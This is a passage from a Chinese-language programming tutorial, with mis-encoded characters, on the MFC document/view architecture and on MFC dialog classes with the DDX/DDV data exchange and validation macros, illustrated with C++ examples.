    <span class="hljs-function">BOOL <span class="hljs-title">InsertText</span><span class="hljs-params">(<span class="hljs-type">int</span> nLine, <span class="hljs-type">int</span> nPos, <span class="hljs-type">const</span> CString&amp; strText)</span></span>;
    <span class="hljs-function">BOOL <span class="hljs-title">DeleteText</span><span class="hljs-params">(<span class="hljs-type">int</span> nLine, <span class="hljs-type">int</span> nPos, <span class="hljs-type">int</span> nCount)</span></span>;
    <span class="hljs-function">CString <span class="hljs-title">GetText</span><span class="hljs-params">(<span class="hljs-type">int</span> nLine, <span class="hljs-type">int</span> nPos, <span class="hljs-type">int</span> nCount)</span> <span class="hljs-type">const</span></span>;
    
    <span class="hljs-comment">// é‡å†™å…³é”®æ–¹æ³•</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">OnNewDocument</span><span class="hljs-params">()</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Serialize</span><span class="hljs-params">(CArchive&amp; ar)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">DeleteContents</span><span class="hljs-params">()</span></span>;
    
    <span class="hljs-built_in">DECLARE_DYNCREATE</span>(CTextDocument)
};

<span class="hljs-comment">// è§†å›¾ç±» - æ˜¾ç¤ºå’Œç¼–è¾‘æ–‡æœ¬</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CTextView</span> : <span class="hljs-keyword">public</span> CScrollView
{
<span class="hljs-keyword">protected</span>:
    <span class="hljs-built_in">CTextView</span>();
    
    <span class="hljs-comment">// ç¼–è¾‘çŠ¶æ€</span>
    <span class="hljs-type">int</span> m_nCaretLine;    <span class="hljs-comment">// å…‰æ ‡æ‰€åœ¨è¡Œ</span>
    <span class="hljs-type">int</span> m_nCaretPos;     <span class="hljs-comment">// å…‰æ ‡åœ¨è¡Œä¸­çš„ä½ç½®</span>
    BOOL m_bSelecting;   <span class="hljs-comment">// æ˜¯å¦åœ¨é€‰æ‹©æ–‡æœ¬</span>
    CPoint m_ptSelectStart; <span class="hljs-comment">// é€‰æ‹©èµ·å§‹ç‚¹</span>
    
    <span class="hljs-comment">// æ˜¾ç¤ºå±æ€§</span>
    CFont m_font;
    CSize m_sizeChar;    <span class="hljs-comment">// å­—ç¬¦å°ºå¯¸</span>
    <span class="hljs-type">int</span> m_nLinesPerPage; <span class="hljs-comment">// æ¯é¡µè¡Œæ•°</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">CTextDocument* <span class="hljs-title">GetDocument</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;
    
    <span class="hljs-comment">// é‡å†™å…³é”®æ–¹æ³•</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnDraw</span><span class="hljs-params">(CDC* pDC)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnInitialUpdate</span><span class="hljs-params">()</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnUpdate</span><span class="hljs-params">(CView* pSender, LPARAM lHint, CObject* pHint)</span></span>;
    
    <span class="hljs-comment">// æ¶ˆæ¯å¤„ç†</span>
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnLButtonDown</span><span class="hljs-params">(UINT nFlags, CPoint point)</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnMouseMove</span><span class="hljs-params">(UINT nFlags, CPoint point)</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnLButtonUp</span><span class="hljs-params">(UINT nFlags, CPoint point)</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnKeyDown</span><span class="hljs-params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnChar</span><span class="hljs-params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnVScroll</span><span class="hljs-params">(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)</span></span>;
    
    <span class="hljs-comment">// è®¡ç®—è¾…åŠ©å‡½æ•°</span>
    <span class="hljs-function">CPoint <span class="hljs-title">CharPosFromPoint</span><span class="hljs-params">(CPoint point)</span> <span class="hljs-type">const</span></span>;
    <span class="hljs-function">CPoint <span class="hljs-title">PointFromCharPos</span><span class="hljs-params">(<span class="hljs-type">int</span> nLine, <span class="hljs-type">int</span> nPos)</span> <span class="hljs-type">const</span></span>;
    <span class="hljs-function">CRect <span class="hljs-title">GetLineRect</span><span class="hljs-params">(<span class="hljs-type">int</span> nLine)</span> <span class="hljs-type">const</span></span>;
    
    <span class="hljs-built_in">DECLARE_DYNCREATE</span>(CTextView)
    <span class="hljs-built_in">DECLARE_MESSAGE_MAP</span>()
};
</code></pre>
<h3 data-id="heading-32">ä¹ã€ç°ä»£æ¡†æ¶ä¸­çš„æ¼”è¿›ä¸å¯ç¤º</h3>
<p>è™½ç„¶MFCæ–‡æ¡£/è§†å›¾æ¶æ„å·²é€æ¸é€€å‡ºä¸»æµï¼Œä½†å…¶è®¾è®¡æ€æƒ³åœ¨ç°ä»£æ¡†æ¶ä¸­ä»æœ‰ä½“ç°ï¼š</p>
<ol>
<li><strong>æ•°æ®ç»‘å®š</strong>ï¼šWPF/XAMLçš„æ•°æ®ç»‘å®šæœºåˆ¶æ˜¯æ–‡æ¡£/è§†å›¾åˆ†ç¦»çš„è¿›åŒ–</li>
<li><strong>MVVMæ¨¡å¼</strong>ï¼šModel-View-ViewModelå¯è§†ä¸ºæ–‡æ¡£/è§†å›¾çš„ç°ä»£åŒ–èº«</li>
<li><strong>å“åº”å¼ç¼–ç¨‹</strong>ï¼šRxJSç­‰åº“å®ç°äº†æ›´çµæ´»çš„æ•°æ®-è§†å›¾åŒæ­¥</li>
</ol>
<p><strong>æ¶æ„æ¼”è¿›çš„å¯ç¤ºï¼š</strong></p>
<ul>
<li>å…³æ³¨ç‚¹åˆ†ç¦»æ˜¯æ°¸æ’çš„è®¾è®¡åŸåˆ™</li>
<li>æ¡†æ¶åº”è¯¥æä¾›æ¸…æ™°çš„æ•°æ®æµæŒ‡å¯¼</li>
<li>å¯æµ‹è¯•æ€§åº”è¯¥æˆä¸ºæ¶æ„çš„æ ¸å¿ƒè€ƒé‡</li>
<li>å¹³å°æŠ½è±¡å±‚å¯¹äºé•¿æœŸç»´æŠ¤è‡³å…³é‡è¦</li>
</ul>
<p>æ–‡æ¡£/è§†å›¾æ¶æ„å±•ç¤ºäº†åœ¨ç‰¹å®šæŠ€æœ¯çº¦æŸä¸‹ï¼ˆC++ã€Windowsã€90å¹´ä»£ç¡¬ä»¶ï¼‰å¦‚ä½•å®ç°å¤æ‚åº”ç”¨çš„ç»“æ„åŒ–ç»„ç»‡ã€‚è™½ç„¶å…·ä½“æŠ€æœ¯å·²è¿‡æ—¶ï¼Œä½†å…¶èƒŒåçš„æ¶æ„æ€ç»´â€”â€”å¦‚ä½•ç®¡ç†å¤æ‚æ€§ã€å¦‚ä½•åˆ†ç¦»å…³æ³¨ç‚¹ã€å¦‚ä½•è®¾è®¡å¯æ‰©å±•çš„ç³»ç»Ÿâ€”â€”å¯¹ä»Šå¤©çš„è½¯ä»¶å¼€å‘è€…ä»æœ‰é‡è¦ä»·å€¼ã€‚</p>
<h2 data-id="heading-33">ç¬¬ä¸‰ç« ï¼šMFCå¯¹è¯æ¡†ä¸DDX/DDVæœºåˆ¶â€”â€”ç”¨æˆ·ç•Œé¢çš„æ ‡å‡†åŒ–å°è£…</h2>
<h3 data-id="heading-34">ä¸€ã€å¯¹è¯æ¡†ç¼–ç¨‹çš„æ¼”è¿›ï¼šä»åŸå§‹APIåˆ°MFCå°è£…</h3>
<p>åœ¨åŸå§‹çš„Windows SDKä¸­ï¼Œåˆ›å»ºå’Œç®¡ç†å¯¹è¯æ¡†æ˜¯ä¸€é¡¹ç¹çä¸”å®¹æ˜“å‡ºé”™çš„å·¥ä½œã€‚å¼€å‘è€…éœ€è¦æ‰‹åŠ¨å¤„ç†å¯¹è¯æ¡†è¿‡ç¨‹å‡½æ•°ã€æ§ä»¶æ¶ˆæ¯ã€æ•°æ®éªŒè¯ç­‰ä¸€ç³»åˆ—å¤æ‚ä»»åŠ¡ã€‚MFCçš„å¯¹è¯æ¡†ç±»ï¼ˆCDialogåŠå…¶æ´¾ç”Ÿç±»ï¼‰é€šè¿‡é¢å‘å¯¹è±¡çš„å°è£…ï¼Œæå¤§åœ°ç®€åŒ–äº†è¿™ä¸€è¿‡ç¨‹ã€‚</p>
<h4 data-id="heading-35">1.1 åŸå§‹Win32å¯¹è¯æ¡†ç¼–ç¨‹çš„å¤æ‚æ€§</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// Win32 SDKä¸­çš„å¯¹è¯æ¡†ç¤ºä¾‹</span>
<span class="hljs-function">BOOL CALLBACK <span class="hljs-title">DialogProc</span><span class="hljs-params">(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>
</span>{
    <span class="hljs-keyword">switch</span> (uMsg)
    {
        <span class="hljs-keyword">case</span> WM_INITDIALOG:
            <span class="hljs-comment">// åˆå§‹åŒ–æ§ä»¶</span>
            <span class="hljs-built_in">SetDlgItemText</span>(hwndDlg, IDC_EDIT_NAME, <span class="hljs-string">"é»˜è®¤åç§°"</span>);
            <span class="hljs-built_in">SetDlgItemInt</span>(hwndDlg, IDC_EDIT_AGE, <span class="hljs-number">25</span>, FALSE);
            <span class="hljs-keyword">return</span> TRUE;
            
        <span class="hljs-keyword">case</span> WM_COMMAND:
            <span class="hljs-keyword">switch</span> (<span class="hljs-built_in">LOWORD</span>(wParam))
            {
                <span class="hljs-keyword">case</span> IDOK:
                {
                    <span class="hljs-comment">// è·å–æ•°æ®</span>
                    TCHAR szName[<span class="hljs-number">100</span>];
                    <span class="hljs-built_in">GetDlgItemText</span>(hwndDlg, IDC_EDIT_NAME, szName, <span class="hljs-number">100</span>);
                    
                    <span class="hljs-comment">// æ‰‹åŠ¨éªŒè¯</span>
                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">lstrlen</span>(szName) == <span class="hljs-number">0</span>)
                    {
                        <span class="hljs-built_in">MessageBox</span>(hwndDlg, <span class="hljs-string">"å§“åä¸èƒ½ä¸ºç©º"</span>, <span class="hljs-string">"é”™è¯¯"</span>, MB_OK);
                        <span class="hljs-keyword">return</span> TRUE;
                    }
                    
                    <span class="hljs-type">int</span> nAge = <span class="hljs-built_in">GetDlgItemInt</span>(hwndDlg, IDC_EDIT_AGE, <span class="hljs-literal">NULL</span>, FALSE);
                    <span class="hljs-keyword">if</span> (nAge &lt; <span class="hljs-number">0</span> || nAge &gt; <span class="hljs-number">150</span>)
                    {
                        <span class="hljs-built_in">MessageBox</span>(hwndDlg, <span class="hljs-string">"å¹´é¾„å¿…é¡»åœ¨0-150ä¹‹é—´"</span>, <span class="hljs-string">"é”™è¯¯"</span>, MB_OK);
                        <span class="hljs-keyword">return</span> TRUE;
                    }
                    
                    <span class="hljs-built_in">EndDialog</span>(hwndDlg, IDOK);
                    <span class="hljs-keyword">return</span> TRUE;
                }
                
                <span class="hljs-keyword">case</span> IDCANCEL:
                    <span class="hljs-built_in">EndDialog</span>(hwndDlg, IDCANCEL);
                    <span class="hljs-keyword">return</span> TRUE;
            }
            <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">return</span> FALSE;
}

<span class="hljs-comment">// è°ƒç”¨å¯¹è¯æ¡†</span>
<span class="hljs-built_in">DialogBox</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCE</span>(IDD_MYDIALOG), hwndParent, DialogProc);
</code></pre>
<p>è¿™ç§æ¨¡å¼å­˜åœ¨æ˜æ˜¾é—®é¢˜ï¼š</p>
<ol>
<li><strong>ä»£ç å†—é•¿</strong>ï¼šæ¯ä¸ªæ§ä»¶éƒ½éœ€è¦å•ç‹¬è·å–å’Œè®¾ç½®</li>
<li><strong>éªŒè¯åˆ†æ•£</strong>ï¼šéªŒè¯é€»è¾‘ä¸UIé€»è¾‘æ··æ‚</li>
<li><strong>ç±»å‹ä¸å®‰å…¨</strong>ï¼šæ‰€æœ‰æ•°æ®éƒ½æ˜¯å­—ç¬¦ä¸²æˆ–æ•´æ•°ï¼Œéœ€è¦æ‰‹åŠ¨è½¬æ¢</li>
<li><strong>éš¾ä»¥ç»´æŠ¤</strong>ï¼šæ·»åŠ æ–°æ§ä»¶éœ€è¦ä¿®æ”¹å¤šä¸ªåœ°æ–¹</li>
</ol>
<h3 data-id="heading-36">äºŒã€MFCå¯¹è¯æ¡†ç±»çš„å°è£…æ¶æ„</h3>
<h4 data-id="heading-37">2.1 CDialogç±»å±‚æ¬¡ç»“æ„</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// MFCå¯¹è¯æ¡†ç±»çš„åŸºæœ¬å±‚æ¬¡</span>
CObject
â””â”€â”€ CCmdTarget
    â””â”€â”€ CWnd
        â””â”€â”€ CDialog
            â”œâ”€â”€ <span class="hljs-built_in">CCommonDialog</span> (é€šç”¨å¯¹è¯æ¡†åŸºç±»)
            â”‚   â”œâ”€â”€ CFileDialog
            â”‚   â”œâ”€â”€ CColorDialog
            â”‚   â”œâ”€â”€ CFontDialog
            â”‚   â””â”€â”€ ...
            â””â”€â”€ <span class="hljs-built_in">CDialogEx</span> (å¢å¼ºåŠŸèƒ½)

<span class="hljs-comment">// å…¸å‹çš„MFCå¯¹è¯æ¡†ç±»å®šä¹‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyDialog</span> : <span class="hljs-keyword">public</span> CDialogEx
{
    <span class="hljs-built_in">DECLARE_DYNAMIC</span>(CMyDialog)

<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// æ ‡å‡†æ„é€ å‡½æ•°</span>
    <span class="hljs-built_in">CMyDialog</span>(CWnd* pParent = <span class="hljs-literal">NULL</span>);
    
    <span class="hljs-comment">// å¯¹è¯æ¡†èµ„æºID</span>
    <span class="hljs-keyword">enum</span> { IDD = IDD_MYDIALOG };

<span class="hljs-keyword">protected</span>:
    <span class="hljs-comment">// DDX/DDVæ”¯æŒ</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">DoDataExchange</span><span class="hljs-params">(CDataExchange* pDX)</span></span>;

    <span class="hljs-comment">// æ¶ˆæ¯æ˜ å°„</span>
    <span class="hljs-built_in">DECLARE_MESSAGE_MAP</span>()

<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// æ§ä»¶å…³è”å˜é‡</span>
    CString m_strName;
    <span class="hljs-type">int</span> m_nAge;
    BOOL m_bAgree;
    CComboBox m_cboGender;
};
</code></pre>
<h4 data-id="heading-38">2.2 å¯¹è¯æ¡†ç”Ÿå‘½å‘¨æœŸç®¡ç†</h4>
<p>MFCå¯¹è¯æ¡†çš„ç”Ÿå‘½å‘¨æœŸç”±ä»¥ä¸‹å…³é”®æ–¹æ³•æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// å¯¹è¯æ¡†åˆ›å»ºä¸é”€æ¯æµç¨‹</span>
<span class="hljs-function">BOOL <span class="hljs-title">CMyDialog::OnInitDialog</span><span class="hljs-params">()</span>
</span>{
    CDialogEx::<span class="hljs-built_in">OnInitDialog</span>();
    
    <span class="hljs-comment">// 1. åˆå§‹åŒ–æ§ä»¶</span>
    m_cboGender.<span class="hljs-built_in">AddString</span>(_T(<span class="hljs-string">"ç”·"</span>));
    m_cboGender.<span class="hljs-built_in">AddString</span>(_T(<span class="hljs-string">"å¥³"</span>));
    m_cboGender.<span class="hljs-built_in">SetCurSel</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-comment">// 2. è®¾ç½®åˆå§‹æ•°æ®</span>
    m_strName = _T(<span class="hljs-string">"å¼ ä¸‰"</span>);
    m_nAge = <span class="hljs-number">25</span>;
    m_bAgree = TRUE;
    
    <span class="hljs-comment">// 3. æ›´æ–°æ§ä»¶æ˜¾ç¤º</span>
    <span class="hljs-built_in">UpdateData</span>(FALSE);
    
    <span class="hljs-comment">// 4. å…¶ä»–åˆå§‹åŒ–</span>
    <span class="hljs-built_in">CenterWindow</span>();  <span class="hljs-comment">// å±…ä¸­æ˜¾ç¤º</span>
    
    <span class="hljs-keyword">return</span> TRUE;
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyDialog::OnOK</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-comment">// 1. ä»æ§ä»¶è·å–æ•°æ®å¹¶éªŒè¯</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">UpdateData</span>(TRUE))
        <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// éªŒè¯å¤±è´¥ï¼Œä¸å…³é—­å¯¹è¯æ¡†</span>
    
    <span class="hljs-comment">// 2. é¢å¤–çš„ä¸šåŠ¡é€»è¾‘éªŒè¯</span>
    <span class="hljs-keyword">if</span> (m_strName.<span class="hljs-built_in">GetLength</span>() &lt; <span class="hljs-number">2</span>)
    {
        <span class="hljs-built_in">MessageBox</span>(_T(<span class="hljs-string">"å§“åè‡³å°‘éœ€è¦2ä¸ªå­—ç¬¦"</span>), _T(<span class="hljs-string">"é”™è¯¯"</span>), MB_ICONERROR);
        <span class="hljs-built_in">GetDlgItem</span>(IDC_EDIT_NAME)-&gt;<span class="hljs-built_in">SetFocus</span>();
        <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// 3. è°ƒç”¨åŸºç±»OnOKå…³é—­å¯¹è¯æ¡†</span>
    CDialogEx::<span class="hljs-built_in">OnOK</span>();
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyDialog::OnCancel</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-comment">// å–æ¶ˆå‰çš„ç¡®è®¤</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">MessageBox</span>(_T(<span class="hljs-string">"ç¡®å®šè¦å–æ¶ˆå—ï¼Ÿ"</span>), _T(<span class="hljs-string">"ç¡®è®¤"</span>), 
                   MB_YESNO | MB_ICONQUESTION) == IDYES)
    {
        CDialogEx::<span class="hljs-built_in">OnCancel</span>();
    }
}
</code></pre>
<h3 data-id="heading-39">ä¸‰ã€DDXï¼ˆå¯¹è¯æ¡†æ•°æ®äº¤æ¢ï¼‰æœºåˆ¶è¯¦è§£</h3>
<h4 data-id="heading-40">3.1 DDXçš„æ ¸å¿ƒåŸç†</h4>
<p>DDXæœºåˆ¶é€šè¿‡<code>DoDataExchange</code>å‡½æ•°å’Œä¸€ç»„é¢„å®šä¹‰çš„å®ï¼Œåœ¨å¯¹è¯æ¡†æ§ä»¶å’Œæˆå‘˜å˜é‡ä¹‹é—´å»ºç«‹åŒå‘æ•°æ®ç»‘å®šï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// DoDataExchangeå‡½æ•°çš„æ ‡å‡†å®ç°</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyDialog::DoDataExchange</span><span class="hljs-params">(CDataExchange* pDX)</span>
</span>{
    CDialogEx::<span class="hljs-built_in">DoDataExchange</span>(pDX);
    
    <span class="hljs-comment">// æ–‡æœ¬æ§ä»¶äº¤æ¢</span>
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_NAME, m_strName);
    
    <span class="hljs-comment">// æ•°å€¼æ§ä»¶äº¤æ¢</span>
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_AGE, m_nAge);
    
    <span class="hljs-comment">// å¤é€‰æ¡†äº¤æ¢</span>
    <span class="hljs-built_in">DDX_Check</span>(pDX, IDC_CHECK_AGREE, m_bAgree);
    
    <span class="hljs-comment">// å•é€‰æŒ‰é’®äº¤æ¢</span>
    <span class="hljs-built_in">DDX_Radio</span>(pDX, IDC_RADIO_MALE, m_nGender);
    
    <span class="hljs-comment">// ç»„åˆæ¡†äº¤æ¢</span>
    <span class="hljs-built_in">DDX_CBIndex</span>(pDX, IDC_COMBO_STATUS, m_nStatusIndex);
    <span class="hljs-built_in">DDX_CBString</span>(pDX, IDC_COMBO_STATUS, m_strStatus);
    
    <span class="hljs-comment">// åˆ—è¡¨æ¡†äº¤æ¢</span>
    <span class="hljs-built_in">DDX_LBIndex</span>(pDX, IDC_LIST_ITEMS, m_nSelectedItem);
    
    <span class="hljs-comment">// æ§ä»¶å¯¹è±¡äº¤æ¢</span>
    <span class="hljs-built_in">DDX_Control</span>(pDX, IDC_COMBO_GENDER, m_cboGender);
}
</code></pre>
<h4 data-id="heading-41">3.2 DDXå®çš„ç¼–è¯‘æ—¶å±•å¼€</h4>
<p>ç¼–è¯‘å™¨ä¼šå°†DDXå®å±•å¼€ä¸ºå…·ä½“çš„ä»£ç ï¼Œä»¥ä¸‹æ˜¯å¯¹<code>DDX_Text</code>å®å±•å¼€çš„æ¨¡æ‹Ÿï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// DDX_Textå®çš„è¿‘ä¼¼å±•å¼€ï¼ˆæ¦‚å¿µæ€§ä»£ç ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> DDX_Text(pDX, nIDC, value) \
    do { \
        <span class="hljs-keyword">if</span> ((pDX)-&gt;m_bSaveAndValidate) { \
            <span class="hljs-comment">/* ä»æ§ä»¶è·å–æ•°æ®åˆ°å˜é‡ */</span> \
            HWND hWndCtrl = ::GetDlgItem((pDX)-&gt;m_pDlgWnd-&gt;m_hWnd, nIDC); \
            <span class="hljs-keyword">if</span> (hWndCtrl != NULL) { \
                int nLen = ::GetWindowTextLength(hWndCtrl); \
                CString strTemp; \
                ::GetWindowText(hWndCtrl, strTemp.GetBuffer(nLen), nLen + 1); \
                strTemp.ReleaseBuffer(); \
                <span class="hljs-comment">/* ç±»å‹è½¬æ¢å’Œèµ‹å€¼ */</span> \
                value = _ttoi(strTemp); <span class="hljs-comment">/* å¯¹äºintç±»å‹ */</span> \
            } \
        } <span class="hljs-keyword">else</span> { \
            <span class="hljs-comment">/* ä»å˜é‡è®¾ç½®æ•°æ®åˆ°æ§ä»¶ */</span> \
            CString strTemp; \
            strTemp.Format(_T(<span class="hljs-string">"%d"</span>), value); <span class="hljs-comment">/* å¯¹äºintç±»å‹ */</span> \
            ::SetDlgItemText((pDX)-&gt;m_pDlgWnd-&gt;m_hWnd, nIDC, strTemp); \
        } \
    } while (0)</span>
</code></pre>
<h4 data-id="heading-42">3.3 å®Œæ•´DDXæ”¯æŒçš„æ•°æ®ç±»å‹</h4>
<p>MFCä¸ºä¸åŒç±»å‹çš„æ•°æ®æä¾›äº†ä¸“é—¨çš„DDXå®ï¼š</p>













































































<table><thead><tr><th>æ•°æ®ç±»å‹</th><th>DDXå®</th><th>ç¤ºä¾‹</th><th>é€‚ç”¨æ§ä»¶</th></tr></thead><tbody><tr><td><strong>CString</strong></td><td><code>DDX_Text</code></td><td><code>DDX_Text(pDX, IDC_EDIT, m_strValue)</code></td><td>ç¼–è¾‘æ¡†</td></tr><tr><td><strong>int</strong></td><td><code>DDX_Text</code></td><td><code>DDX_Text(pDX, IDC_EDIT, m_nValue)</code></td><td>ç¼–è¾‘æ¡†</td></tr><tr><td><strong>UINT</strong></td><td><code>DDX_Text</code></td><td><code>DDX_Text(pDX, IDC_EDIT, m_uValue)</code></td><td>ç¼–è¾‘æ¡†</td></tr><tr><td><strong>long</strong></td><td><code>DDX_Text</code></td><td><code>DDX_Text(pDX, IDC_EDIT, m_lValue)</code></td><td>ç¼–è¾‘æ¡†</td></tr><tr><td><strong>DWORD</strong></td><td><code>DDX_Text</code></td><td><code>DDX_Text(pDX, IDC_EDIT, m_dwValue)</code></td><td>ç¼–è¾‘æ¡†</td></tr><tr><td><strong>float</strong></td><td><code>DDX_Text</code></td><td><code>DDX_Text(pDX, IDC_EDIT, m_fValue)</code></td><td>ç¼–è¾‘æ¡†</td></tr><tr><td><strong>double</strong></td><td><code>DDX_Text</code></td><td><code>DDX_Text(pDX, IDC_EDIT, m_dValue)</code></td><td>ç¼–è¾‘æ¡†</td></tr><tr><td><strong>BOOL</strong></td><td><code>DDX_Check</code></td><td><code>DDX_Check(pDX, IDC_CHECK, m_bValue)</code></td><td>å¤é€‰æ¡†</td></tr><tr><td><strong>int</strong> (å•é€‰)</td><td><code>DDX_Radio</code></td><td><code>DDX_Radio(pDX, IDC_RADIO1, m_nIndex)</code></td><td>å•é€‰æŒ‰é’®ç»„</td></tr><tr><td><strong>CComboBox</strong></td><td><code>DDX_Control</code></td><td><code>DDX_Control(pDX, IDC_COMBO, m_combo)</code></td><td>ç»„åˆæ¡†å¯¹è±¡</td></tr><tr><td><strong>CListBox</strong></td><td><code>DDX_Control</code></td><td><code>DDX_Control(pDX, IDC_LIST, m_list)</code></td><td>åˆ—è¡¨æ¡†å¯¹è±¡</td></tr></tbody></table>
<h3 data-id="heading-43">å››ã€DDVï¼ˆå¯¹è¯æ¡†æ•°æ®éªŒè¯ï¼‰æœºåˆ¶è¯¦è§£</h3>
<h4 data-id="heading-44">4.1 DDVçš„å·¥ä½œåŸç†</h4>
<p>DDVåœ¨æ•°æ®äº¤æ¢çš„åŒæ—¶è¿›è¡ŒéªŒè¯ï¼Œç¡®ä¿æ•°æ®çš„æœ‰æ•ˆæ€§ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// å¸¦æœ‰DDVéªŒè¯çš„DoDataExchangeç¤ºä¾‹</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyDialog::DoDataExchange</span><span class="hljs-params">(CDataExchange* pDX)</span>
</span>{
    CDialogEx::<span class="hljs-built_in">DoDataExchange</span>(pDX);
    
    <span class="hljs-comment">// æ•°æ®äº¤æ¢</span>
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_NAME, m_strName);
    
    <span class="hljs-comment">// æ•°æ®éªŒè¯</span>
    <span class="hljs-built_in">DDV_MaxChars</span>(pDX, m_strName, <span class="hljs-number">50</span>);  <span class="hljs-comment">// æœ€å¤š50ä¸ªå­—ç¬¦</span>
    
    <span class="hljs-comment">// æ•°å€¼äº¤æ¢ä¸éªŒè¯</span>
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_AGE, m_nAge);
    <span class="hljs-built_in">DDV_MinMaxInt</span>(pDX, m_nAge, <span class="hljs-number">0</span>, <span class="hljs-number">150</span>);  <span class="hljs-comment">// èŒƒå›´0-150</span>
    
    <span class="hljs-comment">// å­—ç¬¦ä¸²éç©ºéªŒè¯</span>
    <span class="hljs-built_in">DDV_NonEmptyString</span>(pDX, m_strName);
}
</code></pre>
<h4 data-id="heading-45">4.2 DDVéªŒè¯å¤±è´¥çš„å¤„ç†æœºåˆ¶</h4>
<p>å½“DDVéªŒè¯å¤±è´¥æ—¶ï¼ŒMFCä¼šæŠ›å‡ºå¼‚å¸¸å¹¶è‡ªåŠ¨å¤„ç†ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// DDV_MinMaxIntå®çš„å†…éƒ¨å®ç°é€»è¾‘ï¼ˆæ¦‚å¿µæ€§ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> DDV_MinMaxInt(pDX, value, minVal, maxVal) \
    do { \
        <span class="hljs-keyword">if</span> ((pDX)-&gt;m_bSaveAndValidate &amp;&amp; (value <span class="hljs-string">&lt; minVal || value &gt;</span> maxVal)) { \
            <span class="hljs-comment">/* å‡†å¤‡é”™è¯¯ä¿¡æ¯ */</span> \
            CString strError; \
            strError.Format(_T(<span class="hljs-string">"æ•°å€¼å¿…é¡»åœ¨%då’Œ%dä¹‹é—´"</span>), minVal, maxVal); \
            \
            <span class="hljs-comment">/* æ˜¾ç¤ºé”™è¯¯å¯¹è¯æ¡† */</span> \
            AfxMessageBox(strError, MB_ICONEXCLAMATION); \
            \
            <span class="hljs-comment">/* æŠ›å‡ºå¼‚å¸¸åœæ­¢åç»­å¤„ç† */</span> \
            (pDX)-&gt;Fail(); \
        } \
    } while (0)</span>

<span class="hljs-comment">// CDataExchange::Fail()æ–¹æ³•çš„ç®€åŒ–å®ç°</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CDataExchange::Fail</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-comment">// è®¾ç½®ç„¦ç‚¹åˆ°é—®é¢˜æ§ä»¶</span>
    <span class="hljs-keyword">if</span> (m_hWndLastControl != <span class="hljs-literal">NULL</span> &amp;&amp; ::<span class="hljs-built_in">IsWindow</span>(m_hWndLastControl))
    {
        ::<span class="hljs-built_in">SetFocus</span>(m_hWndLastControl);
    }
    
    <span class="hljs-comment">// æŠ›å‡ºå¼‚å¸¸ï¼Œè¢«MFCæ¡†æ¶æ•è·</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">CUserException</span>();
}
</code></pre>
<h4 data-id="heading-46">4.3 è‡ªå®šä¹‰DDVéªŒè¯</h4>
<p>é™¤äº†å†…ç½®çš„DDVå®ï¼Œè¿˜å¯ä»¥åˆ›å»ºè‡ªå®šä¹‰éªŒè¯ï¼š</p>
